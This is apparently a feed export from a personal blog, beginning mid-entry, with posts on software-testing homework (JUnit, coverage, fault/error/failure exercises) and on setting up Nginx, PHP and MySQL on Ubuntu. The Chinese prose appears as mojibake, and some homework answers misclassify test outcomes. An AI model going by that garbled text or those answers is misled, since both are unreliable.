b){        if(b % a == 0)            return true;        return false;    }    public static int[] printPrimes (int n){        int curPrime;        // Value currently considered for primeness        int numPrimes;        // Number of primes found so far.        boolean isPrime;    // Is curPrime prime?        int [] primes = new int [MAXPRIMES]; // The list of prime numbers.        // Initialize 2 into the list of primes.        primes[0] = 2;        numPrimes = 1;        curPrime = 2;        while(numPrimes &lt; n){            curPrime++;        //next number to consider ...            isPrime = true;            for(int i = 0; i &lt;= numPrimes-1; i++){                if(isDivisible(primes[i], curPrime)){                    isPrime = false;                    break;                }            }            if(isPrime){                primes[numPrimes] = curPrime;                numPrimes++;            }        } // end while        //Print all the primes out.        for(int i = 0; i &lt;= numPrimes-1; i ++){            System.out.println(&quot;Prime: &quot;+ primes[i]);        }        return primes;    } // end printPrimes}</code></pre><p>MainTest.java</p><pre><code>import org.junit.Test;import static org.junit.Assert.*;/** * Created by hardy on 17-3-15. */public class MainTest {    @Test    public void printPrimes() throws Exception {        int [] a = new int [] {2, 3, 5, 7, 11};        assertArrayEquals(a, Main.printPrimes(5));    }}</code></pre><p><img src="/images/2017-3-15-00-15.png" alt="pictures"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹¦ä¸Šçš„ç»ƒä¹ é¢˜ï¼Œè¦æ±‚è®¾è®¡ç›¸åº”çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå†™å‡ºä¸»è·¯å¾„è¦†ç›–&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#problem&quot;&gt;Problem Description&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#answer&quot;&gt;Answer&lt;/a&gt;&lt;!--mo--&gt;
&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="ä½œä¸š" scheme="https://blog.liebes.top/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="è½¯ä»¶æµ‹è¯•ä½œä¸š" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Nginx æœ¬åœ°è™šæ‹Ÿä¸»æœºæ­å»º</title>
    <link href="https://blog.liebes.top/2017/03/13/lemp-vhost/"/>
    <id>https://blog.liebes.top/2017/03/13/lemp-vhost/</id>
    <published>2017-03-13T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ¯æ¬¡éƒ½æ­»åœ¨è¿™é‡Œï¼Œè¿™æŠŠç»ˆäºææ˜ç™½äº†ã€‚<br>å¼„ä¸ªè™šæ‹Ÿä¸»æœºçš„ç›®çš„æ˜¯å°†å¤šä¸ªé¡¹ç›®éƒ½å¯ä»¥è·‘åœ¨è™šæ‹ŸåŸŸåçš„æ ¹ç›®å½•ä¸‹ï¼Œåœ¨æœ¬åœ°è°ƒè¯•ç»“æ„ä¹Ÿæ¯”è¾ƒæ¸…æ™°ã€‚</p><hr><p>é¦–å…ˆå¤‡ä»½ä¸€ä»½ default é…ç½®æ–‡ä»¶</p><pre><code>$ sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/default.bak</code></pre><p>æ¥ä¸‹æ¥ä»¥example.comåŸŸåä¸ºä¾‹</p><pre><code>$ sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/example.com.conf</code></pre><p>ä¿®æ”¹æ–°çš„é…ç½®æ–‡ä»¶çš„å†…å®¹</p><pre><code>server {    listen 80;    listen [::]:80;    server_name example.com;    root /var/www/example.com;    index index.html index.php;    location / {        try_files $uri $uri/ =404;    }    location ~ \.php$ {        include snippets/fastcgi-php.conf;        fastcgi_pass 127.0.0.1:9000;    }    location ~ /\.ht {        deny all;    }}</code></pre><p>è¿™é‡Œä½ éœ€è¦æœ‰å¯¹åº”çš„å·¥ä½œç›®å½•ï¼Œå°†é…ç½®æ–‡ä»¶é“¾æ¥åˆ° <code>sites-enabled</code> ä¸­ä½¿å…¶ç”Ÿæ•ˆ<br>ä¸‹é¢è¿™é‡Œè¦æ³¨æ„äº†ï¼Œä¸€å®šè¦å†™ç»å¯¹è·¯å¾„ã€‚</p><pre><code>$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/$ sudo systemctl reload nginx</code></pre><p>åœ¨hostsæ–‡ä»¶ä¸­åŠ ä¸Šæ˜ å°„</p><pre><code>$ vi /etc/hosts127.0.0.1 example.com$ sudo /etc/init.d/networking restart</code></pre><p>å»æµè§ˆå™¨è®¿é—® example.com å°±å¯ä»¥çœ‹åˆ°å¯¹åº”çš„ç½‘é¡µäº†</p><hr><p>ä¹‹å‰æ¯æ¬¡è²Œä¼¼éƒ½æ˜¯åœ¨åšé“¾æ¥é‚£é‡Œæ­»äº†ï¼Œå› ä¸ºåªè¦ç”¨ç›¸å¯¹è·¯å¾„ï¼Œé“¾æ¥ä¸ä¸Šï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚<br>æŒ½å°Š</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰æ¯æ¬¡éƒ½æ­»åœ¨è¿™é‡Œï¼Œè¿™æŠŠç»ˆäºææ˜ç™½äº†ã€‚&lt;br&gt;å¼„ä¸ªè™šæ‹Ÿä¸»æœºçš„ç›®çš„æ˜¯å°†å¤šä¸ªé¡¹ç›®éƒ½å¯ä»¥è·‘åœ¨è™šæ‹ŸåŸŸåçš„æ ¹ç›®å½•ä¸‹ï¼Œåœ¨æœ¬åœ°è°ƒè¯•ç»“æ„ä¹Ÿæ¯”è¾ƒæ¸…æ™°ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;é¦–å…ˆå¤‡ä»½ä¸€ä»½ default é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo cp /etc/nginx/si
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥å¿—" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="Nginx" scheme="https://blog.liebes.top/tags/Nginx/"/>
    
      <category term="Vhost" scheme="https://blog.liebes.top/tags/Vhost/"/>
    
  </entry>
  
  <entry>
    <title>ã€è½¯ä»¶æµ‹è¯•ã€‘JUNITä½¿ç”¨åŠè¦†ç›–æµ‹è¯•</title>
    <link href="https://blog.liebes.top/2017/03/10/SoftwareTest-LIB-1/"/>
    <id>https://blog.liebes.top/2017/03/10/SoftwareTest-LIB-1/</id>
    <published>2017-03-10T23:34:01.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>è½¯ä»¶æµ‹è¯•ç¬¬ä¸€æ¬¡ä¸Šæœºï¼Œæµ‹è¯•äº†ä¸€ä¸‹JUnitçš„ä½¿ç”¨å’Œè¦†ç›–æµ‹è¯•ï¼Œè™½ç„¶å®éªŒè¦æ±‚æ˜¯ç”¨eclipseï¼Œä½†æˆ‘è¿˜æ˜¯è¢«ideaçš„ç¾è‰²æ‰€è‡£æœã€‚</p><ul><li><a href="#junit">Junit å®‰è£…ä¸ä½¿ç”¨</a></li><li><a href="#cover">è¦†ç›–æµ‹è¯•</a></li></ul><hr><p></p><h2 id="junit">Junit å®‰è£…ä¸ä½¿ç”¨</h2><br>é¦–å…ˆå»å®˜ç½‘ä¸‹è½½Junitçš„jaråŒ…å’Œå…¶ä¾èµ–<p></p><blockquote><p><a href="http://search.maven.org/#search|gav|1|g:&quot;junit&quot; AND a:&quot;junit&quot;" target="_blank" rel="noopener">junit-4.12.jar</a></p></blockquote><blockquote><p><a href="http://search.maven.org/#search|ga|1|g%3Aorg.hamcrest" target="_blank" rel="noopener">hamcrest-core-1.3.jar</a></p></blockquote><p>æ‰“å¼€Ideaï¼Œæ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œå¹¶åœ¨é¡¹ç›®ä¸­ä¸srcç›®å½•å¹³çº§åˆ›å»ºtestå’Œlibæ–‡ä»¶å¤¹ï¼Œå¹¶å°†ä¸‹è½½çš„jaråŒ…æ”¾åœ¨libæ–‡ä»¶å¤¹ä¸­<br><img src="/images/2017-3-10-11-55.png" alt="pictures"><br>åœ¨ideaä¸­å¯¼å…¥junitï¼š<code>File&gt;Project Structure&gt;Modules</code> ç‚¹å‡» â€˜+â€™ å¼•å…¥åˆšåˆšä¸‹è½½çš„jaråŒ…ï¼Œç‚¹å‡» Apply<br><img src="/images/2017-3-10-12-00.png" alt="pictures"><br>å°†testæ–‡ä»¶å¤¹è®¾ç½®ä¸ºæµ‹è¯•æ–‡ä»¶å¤¹<br>åœ¨testæ–‡ä»¶å¤¹å³é”® &gt; Mark Directory as &gt; Test Resources Root<br>å›åˆ°Main.java ç¼–å†™testTriangleæ–¹æ³•</p><pre><code>//åˆ¤æ–­ä¸€ä¸ªä¸‰è§’å½¢çš„å½¢çŠ¶ï¼šç­‰è¾¹ï¼Œç­‰è…°ï¼Œæ™®é€špublic static String testTriangle(int a, int b, int c){    if(a &lt; 0 || b &lt; 0 || c &lt; 0)        return &quot;illegal input&quot;;    else if (a + b &lt;= c || a + c &lt;= b || b + c &lt;= a)        return &quot;illegal input&quot;;    else if (a == b &amp;&amp; b == c)        return &quot;equilateral&quot;;    else if (a == b || b == c)        return &quot;isosceles&quot;;    else        return &quot;scalene&quot;;}</code></pre><p>Ctrl + Shift + T æˆ–è€… Navigate &gt; Test é€‰æ‹© Creat New Test æˆåŠŸåä¼šåœ¨testç›®å½•ä¸‹ç”Ÿæˆtestç±»<br>ä¿®æ”¹testTriangleæ–¹æ³•</p><pre><code>@Test    public void testTriangle() throws Exception {        a = 1;        b = 2;        c = 3;        assertEquals(&quot;illegal input&quot;, Main.testTriangle(a, b, c));        a = 2;        b = 5;        c = 5;        assertEquals(&quot;isosceles&quot;, Main.testTriangle(a, b, c));        a = 5;        b = 5;        c = 5;        assertEquals(&quot;equilateral&quot;, Main.testTriangle(a, b, c));        a = 5;        b = 6;        c = 7;        assertEquals(&quot;scalene&quot;, Main.testTriangle(a, b, c));    }</code></pre><p>Ctrl + Shift + F10 è¿è¡Œæµ‹è¯•ï¼Œå¾—åˆ°è¿è¡Œç»“æœ</p><h2 id><a href="#" class="headerlink" title></a><img src="/images/2017-3-10-17-57.png" alt="pictures"></h2><p></p><h2 id="cover">è¦†ç›–æµ‹è¯•</h2><br>ä½œä¸šè¦æ±‚çš„æ˜¯ä½¿ç”¨Eclemmaï¼Œç„¶è€ŒEclemmaæ˜¯Eclipseçš„æ’ä»¶ï¼Œideaç»§æ‰¿äº†è¦†ç›–æµ‹è¯•<br>Run &gt; Run â€˜Mainâ€™ with Coverage<p></p><h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/images/2017-3-10-18-03.png" alt="pictures"></h2><p>å°±è¿™äº›å•¦ï¼ŒæŒ½å°Šã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è½¯ä»¶æµ‹è¯•ç¬¬ä¸€æ¬¡ä¸Šæœºï¼Œæµ‹è¯•äº†ä¸€ä¸‹JUnitçš„ä½¿ç”¨å’Œè¦†ç›–æµ‹è¯•ï¼Œè™½ç„¶å®éªŒè¦æ±‚æ˜¯ç”¨eclipseï¼Œä½†æˆ‘è¿˜æ˜¯è¢«ideaçš„ç¾è‰²æ‰€è‡£æœã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#junit&quot;&gt;Junit å®‰è£…ä¸ä½¿ç”¨&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cover&quot;&gt;è¦†ç›–æµ‹
      
    
    </summary>
    
      <category term="ä¸Šæœºå®éªŒ" scheme="https://blog.liebes.top/categories/%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="è½¯ä»¶æµ‹è¯•ä¸Šæœºå®éªŒ" scheme="https://blog.liebes.top/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Unbuntu16.04 Nginx + php + mysql WebæœåŠ¡å™¨æ­å»º</title>
    <link href="https://blog.liebes.top/2017/03/10/lemp-Ubantu/"/>
    <id>https://blog.liebes.top/2017/03/10/lemp-Ubantu/</id>
    <published>2017-03-10T23:34:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸‹å†³å¿ƒä¸å†ç”¨lampçš„é›†æˆåŒ…äº†ï¼Œè‡ªå·±æä¸€ä¸ªå‡ºæ¥ã€‚</p><ul><li><a href="#nginx">Nginx</a></li><li><a href="#php">php</a></li><li><a href="#mysql">mysql</a></li></ul><hr><p></p><h2 id="nginx">Nginx</h2><br>é¦–å…ˆå®‰è£…ä½¿ç”¨ apt å®‰è£…nginx<br>$ sudo apt install nginx<br>ç„¶è€Œç”±äºä¹‹å‰å®‰è£…è¿‡nginxï¼Œå¸è½½è¿˜ä¸å¹²å‡€ï¼Œå¯¼è‡´é…ç½®æ–‡ä»¶è¯»å–å¤±è´¥ï¼Œå‡ºç°é”™è¯¯ï¼š<p></p><pre><code>Job for nginx.service failed because the control process exited with error code. See &quot;systemctl status nginx.service&quot; and &quot;journalctl -xe&quot; for details.invoke-rc.d: initscript nginx, action &quot;start&quot; failed.â— nginx.service - A high performance web server and a reverse proxy server   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)   Active: failed (Result: exit-code) since å›› 2017-03-09 00:06:13 CST; 7ms ago  Process: 4540 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=1/FAILURE)3æœˆ 09 00:06:13 hardy-Inspiron-5547 systemd[1]: Starting A high performance....3æœˆ 09 00:06:13 hardy-Inspiron-5547 nginx[4540]: nginx: [emerg] open() &quot;/etc...3æœˆ 09 00:06:13 hardy-Inspiron-5547 nginx[4540]: nginx: configuration file /...3æœˆ 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Control proc...13æœˆ 09 00:06:13 hardy-Inspiron-5547 systemd[1]: Failed to start A high perf....3æœˆ 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Unit entered....3æœˆ 09 00:06:13 hardy-Inspiron-5547 systemd[1]: nginx.service: Failed with ....Hint: Some lines were ellipsized, use -l to show in full.dpkg: å¤„ç†è½¯ä»¶åŒ… nginx-core (--configure)æ—¶å‡ºé”™ï¼š å­è¿›ç¨‹ å·²å®‰è£… post-installation è„šæœ¬ è¿”å›é”™è¯¯çŠ¶æ€ 1dpkg: ä¾èµ–å…³ç³»é—®é¢˜ä½¿å¾— nginx çš„é…ç½®å·¥ä½œä¸èƒ½ç»§ç»­ï¼š nginx ä¾èµ–äº nginx-core (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-full (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-light (&gt;= 1.10.0-0ubuntu0.16.04.4) | nginx-extras (&gt;= 1.10.0-0ubuntu0.16.04.4)ï¼›ç„¶è€Œï¼š  è½¯ä»¶åŒ… nginx-core å°šæœªé…ç½®ã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-fullã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-lightã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-extrasã€‚ nginx ä¾èµ–äº nginx-core (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-full (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-light (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~) | nginx-extras (&lt;&lt; 1.10.0-0ubuntu0.16.04.4.1~)ï¼›ç„¶è€Œï¼š  è½¯ä»¶åŒ… nginx-core å°šæœªé…ç½®ã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-fullã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-lightã€‚  æœªå®‰è£…è½¯ä»¶åŒ… nginx-extrasã€‚dpkg: å¤„ç†è½¯ä»¶åŒ… nginx (--configure)æ—¶å‡ºé”™ï¼š ä¾èµ–å…³ç³»é—®é¢˜ - ä»æœªè¢«é…ç½®åœ¨å¤„ç†æ—¶æœ‰é”™è¯¯å‘ç”Ÿï¼š nginx-core nginxE: Sub-process /usr/bin/dpkg returned an error code (1)</code></pre><p>åœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶è¯»å–å¤±è´¥ï¼Œå½“ç„¶è¿™ä¸ªé”™è¯¯ä¹Ÿæœ‰å¯èƒ½æ˜¯å› ä¸ºapacheå ç”¨äº†80ç«¯å£</p><pre><code># å¦‚æœæ˜¯apacheå ç”¨ç«¯å£çš„è¯$ systemctl stop apache2# å¦‚æœæ˜¯ä¸œè¥¿æ²¡åˆ å¹²å‡€çš„è¯ï¼Œæˆ‘çš„é—®é¢˜æ˜¯è¿™ä¸ª$ sudo apt-get purge nginx nginx-common nginx-full</code></pre><p>è§£å†³ä¹‹åå¯åŠ¨nginxæœåŠ¡ï¼Œå¹¶è®¾ç½®å¼€æœºå¯åŠ¨</p><pre><code># è¾“å…¥å®Œï¼Œåœ¨æœ¬åœ°æ‰“ 127.0.0.1 å·²ç»å¯ä»¥è®¿é—®äº†ï¼Œç„¶è€Œåœ¨è®¾ç½®å¼€æœºå¯åŠ¨çš„æ—¶å€™åˆç‚¸äº†$ systemctl start nginx$ systemctl enable nginx</code></pre><p>ç„¶è€Œè‡ªå®¶ç³»ç»ŸåˆæŠ¥é”™äº†ï¼š</p><pre><code>Synchronizing state of nginx.service with SysV init with /lib/systemd/systemd-sysv-install...Executing /lib/systemd/systemd-sysv-install enable nginxsh: 0: getcwd() failed: No such file or directoryinsserv: pushd() can not change to directory /etc/init.d: No such file or directoryupdate-rc.d: error: insserv rejected the script header</code></pre><p>ç»“æœåŸå› æ˜¯å› ä¸ºæˆ‘å½“å‰çš„å·¥ä½œç›®å½•å·²ç»è¢«åˆ é™¤äº†ï¼Œæ‰€ä»¥â€¦â€¦<br>æˆåŠŸåï¼Œè®¿é—® 127.0.0.1 ä¼šçœ‹åˆ°nginxçš„æ¬¢è¿ç•Œé¢</p><h2 id><a href="#" class="headerlink" title></a><img src="/images/welcomeToNginx.png" alt="pictures"></h2><p></p><h2 id="php">ç¼–è¯‘å®‰è£…PHP7</h2><br>é¦–å…ˆä¸‹è½½php7çš„æºç ï¼š<a href="http://php.net/get/php-7.0.9.tar.gz/from/a/mirror" target="_blank" rel="noopener">é“¾æ¥</a>ç„¶åå®‰è£…éœ€è¦çš„ä¾èµ–<p></p><pre><code>$ sudo apt-get update$ sudo apt-get install libxml2-dev# å®‰è£…gcc$ sudo apt-get install build-essential$ sudo apt-get install openssl$ sudo apt-get install libssl-dev$ sudo apt-get install make$ sudo apt-get install curl$ sudo apt-get install libcurl4-gnutls-dev$ sudo apt-get install libjpeg-dev$ sudo apt-get install libpng-dev$ sudo apt-get install libmcrypt-dev$ sudo apt-get install libreadline6 libreadline6-dev</code></pre><p>è§£å‹ä¸‹è½½å¥½çš„phpæ–‡ä»¶</p><pre><code>$ sudo tar -zxf /tmp/php-7.0.9.tar.gz$ cd php-7.0.9</code></pre><p>ç¼–è¯‘å®‰è£…ï¼ˆè¿™é‡Œéœ€è¦å¥½ä¸€ä¼šå„¿æ—¶é—´ï¼‰</p><pre><code>$ sudo ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli --with-pdo-mysql --with-iconv-dir --with-freetype-dir --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --enable-mbregex --enable-mbstring --with-mcrypt --enable-ftp --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --disable-fileinfo --enable-maintainer-zts$ sudo make &amp;&amp; sudo make install</code></pre><p>å®‰è£…ç»“æŸåï¼Œéœ€è¦é…ç½®ä¸€ä¸‹phpçš„é…ç½®æ–‡ä»¶</p><pre><code>$ cd /usr/local/php/etc$ sudo cp php-fpm.conf.default php-fpm.conf$ cd /usr/local/php/etc/php-fpm.d$ sudo cp www.conf.default www.conf# æ‰“å¼€www.confæ–‡ä»¶å¯ä»¥çœ‹åˆ° user å’Œ group é»˜è®¤è®¾ç½®ä¸º www# å¦‚æœwwwç”¨æˆ·ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå…ˆæ·»åŠ wwwç”¨æˆ·$ sudo groupadd www$ sudo useradd -g www -s /bin/nologin www</code></pre><p>åœ¨ <code>/etc/profile</code> æ–‡ä»¶æœ«å°¾åŠ ä¸Šï¼š</p><pre><code>PATH=$PATH:/usr/local/php/binexport# è¾“å…¥$ source /etc/profile</code></pre><p>éªŒè¯phpå®‰è£…æƒ…å†µå¹¶å¯åŠ¨</p><pre><code>$ php -v$ sudo /usr/local/php/sbin/php-fpm</code></pre><p>é…ç½®nginxé…ç½®ä¸phpé…ç½®</p><pre><code># æˆ‘ä»¬å¯ä»¥å‘ç°/usr/local/php/etc ä¸‹é¢æ˜¯æ²¡æœ‰php.iniæ–‡ä»¶çš„ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥åœ¨ä½ çš„æºç ç›®å½•ä¸‹æ‰¾åˆ°ï¼Œæœ‰ä¸ª php.ini.development çš„æ–‡ä»¶$ sudo cp php.ini.development /usr/local/php/etc/php.ini# æ‰“å¼€iniæ–‡ä»¶ï¼Œä½œå¦‚ä¸‹ä¿®æ”¹cgi.fix_pathinfo=0# ä¿®æ”¹nginxé…ç½®æ–‡ä»¶ /etc/nginx/sites-available/defaultserver {    listen 80 default_server;    listen [::]:80 default_server;    root /var/www/html;    index index.html index.htm index.nginx-debian.html index.php;    server_name server_domain_or_IP;    location / {        try_files $uri $uri/ =404;    }    location ~ \.php$ {        include snippets/fastcgi-php.conf;        fastcgi_pass 127.0.0.1:9000;    }    location ~ /\.ht {        deny all;    }}</code></pre><p>é‡æ–°å¯åŠ¨ nginx å¹¶æµ‹è¯•</p><pre><code>$ sudo systemctl reload nginx$ sudo vi /var/www/html/test.php&lt;?php    echo phpinfo();?&gt;</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/images/phpinfo.png" alt="picture"></h2><p></p><h2 id="mysql">å®‰è£…MYSQL</h2><br>é€šè¿‡ apt å®‰è£…mysqlï¼Œæ ¹æ®æç¤ºè‡ªå®šä¹‰mysql<p></p><pre><code>$ sudo apt-get install mysql-server</code></pre><hr><p>è‡³æ­¤ï¼Œlempçš„ç¯å¢ƒå°±æ­å»ºå®Œäº†ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« æµ·ç—´ä¼šæä¸€æ vhost</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸‹å†³å¿ƒä¸å†ç”¨lampçš„é›†æˆåŒ…äº†ï¼Œè‡ªå·±æä¸€ä¸ªå‡ºæ¥ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#nginx&quot;&gt;Nginx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#php&quot;&gt;php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mysql&quot;&gt;mysql&lt;/a&gt;&lt;/li&gt;
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="Nginx" scheme="https://blog.liebes.top/tags/Nginx/"/>
    
      <category term="web server" scheme="https://blog.liebes.top/tags/web-server/"/>
    
      <category term="Lemp" scheme="https://blog.liebes.top/tags/Lemp/"/>
    
  </entry>
  
  <entry>
    <title>ã€è½¯ä»¶æµ‹è¯•ã€‘ä½œä¸š2 è®¾è®¡æµ‹è¯•ç”¨ä¾‹</title>
    <link href="https://blog.liebes.top/2017/02/26/SoftwareTest-HW-2/"/>
    <id>https://blog.liebes.top/2017/02/26/SoftwareTest-HW-2/</id>
    <published>2017-02-26T23:34:02.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>è½¯ä»¶æµ‹è¯•è¯¾ç¨‹ä½œä¸šï¼ŒæŒ‰ç…§è¦æ±‚è®¾è®¡ç›¸å…³çš„æµ‹è¯•ç”¨ä¾‹</p><ul><li><a href="#problem">é—®é¢˜æè¿°</a></li><li><a href="#answer">é—®é¢˜è§£ç­”</a></li></ul><hr><h2 id="problem">é—®é¢˜æè¿°</h2><blockquote><p>Below are two faulty programs. Each includes a test case that results in failure. Answer the following questions about each program.</p><pre><code>// program 1public int findLast (int[] x, int y) {//Effects: If x==null throw NullPointerException// else return the index of the last element// in x that equals y.// If no such element exists, return -1  for (int i=x.length-1; i &gt; 0; i--){  if (x[i] == y){    return i;  }}return -1;}/ test: x=[2, 3, 5]; y = 2/ Expected = 0</code></pre><pre><code>// program 2public static int lastZero (int[] x) {// Effects: if x==null throw NullPointerException// else return the index of the LAST 0 in x.// Return -1 if 0 does not occur in xfor (int i = 0; i &lt; x.length; i++){  if (x[i] == 0){    return i;  }}return -1;}// test: x=[0, 1, 0]// Expected = 2</code></pre></blockquote><h4 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h4><ul><li>Identify the fault.</li><li>If possible, identify a test case that does not execute the fault. (Reachability)</li><li>If possible, identify a test case that executes the fault, but does not result in an error state.</li><li>If possible identify a test case that results in an error, but not a failure.</li></ul><hr><p></p><h2 id="answer">é—®é¢˜è§£ç­”</h2><p></p><ul><li>program 1<ul><li>ç¨‹åº1ä¸­å¾ªç¯ä½“å†…ï¼Œå˜é‡<code>i</code>åº”ä»<code>x.length</code>éå†åˆ°<code>0</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>for (int i=x.length-1; i &gt; 0; i--)</code> è¿™ä¸€è¡Œåº”å½“æ”¹ä¸º<code>for (int i=x.length-1; i &gt;= 0; i--)</code></li><li>test: <code>x = [1, 2, 3]; y = 3;</code> ç¨‹åºä¼šè¿”å›<code>2</code>ï¼Œä¸”ç¨‹åºä¼šåœ¨ç¬¬ä¸€æ¬¡å¾ªç¯æ—¶ç»“æŸï¼Œä¸ä¼šæ‰§è¡Œåˆ° fault å¤„</li><li>test: <code>x = [1, 2, 3]; y = 1;</code> ç”±äºç¨‹åºæ²¡æœ‰æŸ¥è¯¢ä½ç½®<code>0</code>ï¼Œå› æ­¤ä¼šè¿”å›<code>-1</code>ï¼Œç¨‹åºå¾ªç¯äº†ä¸¤æ¬¡ï¼Œæ‰§è¡Œåˆ°äº†faultå¤„ï¼Œä½†æ²¡æœ‰å¯¼è‡´é”™è¯¯çŠ¶æ€</li><li>test: <code>x = [1, 2, 3]; y = 6;</code> ç”±äº<code>x</code>ä¸­æ²¡æœ‰<code>y</code>ï¼Œå› æ­¤ä¼šè¿”å›<code>-1</code>ï¼Œæ˜¯æ­£ç¡®ç»“æœï¼Œä½†ç¡®å®åœ¨ç¬¬ä¸‰æ¬¡è¿­ä»£æ—¶å‘ç”Ÿäº†é”™è¯¯</li></ul></li><li>program 2<ul><li>ç¨‹åº2ä¸­å¾ªç¯ä½“å†…ï¼Œå˜é‡iåº”å½“ä»åå‘å‰éå†ï¼Œåº”å°†<code>for (int i = 0; i &lt; x.length; i++)</code>è¿™ä¸€è¡Œæ”¹ä¸º<code>for (int i = x.length - 1; i &gt;= 0; i--)</code></li><li>test: <code>x = [0];</code> ç¨‹åºä¼šè¿”å›<code>0</code>ï¼Œç”±äºxåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œä»å‰å‘åä¸ä»åå‘å‰æ²¡æœ‰å·®åˆ«ï¼Œå› æ­¤æ²¡æœ‰æ‰§è¡Œ fault</li><li>test: <code>x = [0, 1, 0];</code> ç¨‹åºä¼šè¿”å›é”™è¯¯ç»“æœ<code>0</code>ï¼Œä½†å¹¶æ²¡æœ‰å¯¼è‡´é”™è¯¯çŠ¶æ€</li><li>test: <code>x = [1, 0, 1];</code> ç¨‹åºè¿”å›äº†æ­£ç¡®ç»“æœ<code>1</code>ï¼Œä½†åœ¨ç¬¬ä¸€æ¬¡ä¸ç¬¬äºŒæ¬¡è¿­ä»£æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚</li></ul><hr>åº”å½“æ˜ç¡®ä¸‰ä¸ªè¯è¯­ <code>fault</code> <code>error</code> <code>failure</code> ä¹‹é—´çš„å·®åˆ«ï¼Œç„¶è€Œæµ·ç—´å¹¶ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ¬¢è¿å¤§ç¥åœ¨ä¸‹é¢æŒ‡å‡ºé”™è¯¯ï¼Œå¹¶å¸®å¿™åˆ†æä¸€ä¸‹è¿™ä¸‰ä¸ªâ€œé”™è¯¯â€å·®åˆ«åœ¨å“ªé‡Œ</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è½¯ä»¶æµ‹è¯•è¯¾ç¨‹ä½œä¸šï¼ŒæŒ‰ç…§è¦æ±‚è®¾è®¡ç›¸å…³çš„æµ‹è¯•ç”¨ä¾‹&lt;/p&gt;
&lt;ul&gt;
